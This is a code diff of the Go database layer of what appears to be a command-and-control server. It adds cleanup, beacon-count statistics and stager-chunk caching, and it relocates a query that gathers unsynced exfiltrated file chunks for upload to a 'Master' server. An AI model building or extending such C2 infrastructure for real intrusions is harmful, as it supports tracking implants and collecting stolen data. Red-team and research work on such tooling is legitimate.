@@ -843,46 +843,91 @@ func (d *Database) GetAllTasksWithLimit(limit int) ([]*Task, error) {
 	return tasks, rows.Err()
 }
 
-// GetUnsyncedExfilChunks retrieves all chunks that haven't been uploaded to Master
-func (d *Database) GetUnsyncedExfilChunks(limit int) ([]map[string]interface{}, error) {
+// CleanupOldData removes old data from the database
+func (d *Database) CleanupOldData(days int) error {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	cutoff := time.Now().AddDate(0, 0, -days).Unix()
+
+	// Delete old tasks
+	_, err := d.db.Exec("DELETE FROM tasks WHERE created_at < ? AND status IN ('completed', 'failed')", cutoff)
+	if err != nil {
+		return fmt.Errorf("failed to cleanup tasks: %w", err)
+	}
+
+	// Delete old task results (cascade should handle this, but just in case)
+	_, err = d.db.Exec("DELETE FROM task_results WHERE received_at < ?", cutoff)
+	if err != nil {
+		return fmt.Errorf("failed to cleanup task results: %w", err)
+	}
+
+	return nil
+}
+
+// GetDatabaseStats returns statistics about the database
+func (d *Database) GetDatabaseStats() (map[string]int64, error) {
 	d.mutex.RLock()
 	defer d.mutex.RUnlock()
 
-	rows, err := d.db.Query(`
-		SELECT c.session_id, c.chunk_index, c.data, s.job_id, s.file_name, s.file_size, s.total_chunks
-		FROM exfil_chunks c
-		JOIN exfil_sessions s ON c.session_id = s.session_id
-		WHERE c.synced = 0
-		LIMIT ?
-	`, limit)
-	if err != nil {
+	stats := make(map[string]int64)
+
+	// Count beacons
+	var count int64
+	if err := d.db.QueryRow("SELECT COUNT(*) FROM beacons").Scan(&count); err != nil {
 		return nil, err
 	}
-	defer rows.Close()
+	stats["beacons"] = count
 
-	var chunks []map[string]interface{}
-	for rows.Next() {
-		var sessionID, jobID, fileName string
-		var chunkIndex, totalChunks int
-		var fileSize int64
-		var data []byte
+	// Count active beacons (last 5 mins)
+	activeCutoff := time.Now().Add(-5 * time.Minute).Unix()
+	if err := d.db.QueryRow("SELECT COUNT(*) FROM beacons WHERE last_seen > ?", activeCutoff).Scan(&count); err != nil {
+		return nil, err
+	}
+	stats["active_beacons"] = count
 
-		if err := rows.Scan(&sessionID, &chunkIndex, &data, &jobID, &fileName, &fileSize, &totalChunks); err != nil {
-			return nil, err
-		}
+	// Count tasks
+	if err := d.db.QueryRow("SELECT COUNT(*) FROM tasks").Scan(&count); err != nil {
+		return nil, err
+	}
+	stats["tasks"] = count
 
-		chunks = append(chunks, map[string]interface{}{
-			"session_id":   sessionID,
-			"chunk_index":  chunkIndex,
-			"data":         data,
-			"job_id":       jobID,
-			"file_name":    fileName,
-			"file_size":    fileSize,
-			"total_chunks": totalChunks,
-		})
+	return stats, nil
+}
+
+// CacheStagerChunks stores stager chunks in the database for quick retrieval
+func (d *Database) CacheStagerChunks(clientBinaryID string, chunks []string) error {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	tx, err := d.db.Begin()
+	if err != nil {
+		return err
+	}
+	defer tx.Rollback()
+
+	now := time.Now().Unix()
+
+	// Clear existing cache for this binary
+	_, err = tx.Exec("DELETE FROM stager_chunk_cache WHERE client_binary_id = ?", clientBinaryID)
+	if err != nil {
+		return err
 	}
 
-	return chunks, rows.Err()
+	// Insert new chunks
+	stmt, err := tx.Prepare("INSERT INTO stager_chunk_cache (client_binary_id, chunk_index, chunk_data, cached_at) VALUES (?, ?, ?, ?)")
+	if err != nil {
+		return err
+	}
+	defer stmt.Close()
+
+	for i, chunk := range chunks {
+		if _, err := stmt.Exec(clientBinaryID, i, chunk, now); err != nil {
+			return err
+		}
+	}
+
+	return tx.Commit()
 }
 
 // MarkExfilChunkSynced marks a chunk as successfully uploaded to Master
@@ -1023,4 +1068,46 @@ func (d *Database) UpdateExfilSessionStatus(sessionID, status string) error {
 	`, status, time.Now().Unix(), sessionID)
 
 	return err
+}
+
+// GetUnsyncedExfilChunks retrieves all chunks that haven't been uploaded to Master
+func (d *Database) GetUnsyncedExfilChunks(limit int) ([]map[string]interface{}, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	rows, err := d.db.Query(`
+		SELECT c.session_id, c.chunk_index, c.data, s.job_id, s.file_name, s.file_size, s.total_chunks
+		FROM exfil_chunks c
+		JOIN exfil_sessions s ON c.session_id = s.session_id
+		WHERE c.synced = 0
+		LIMIT ?
+	`, limit)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	var chunks []map[string]interface{}
+	for rows.Next() {
+		var sessionID, jobID, fileName string
+		var chunkIndex, totalChunks int
+		var fileSize int64
+		var data []byte
+
+		if err := rows.Scan(&sessionID, &chunkIndex, &data, &jobID, &fileName, &fileSize, &totalChunks); err != nil {
+			return nil, err
+		}
+
+		chunks = append(chunks, map[string]interface{}{
+			"session_id":   sessionID,
+			"chunk_index":  chunkIndex,
+			"data":         data,
+			"job_id":       jobID,
+			"file_name":    fileName,
+			"file_size":    fileSize,
+			"total_chunks": totalChunks,
+		})
+	}
+
+	return chunks, rows.Err()
 }
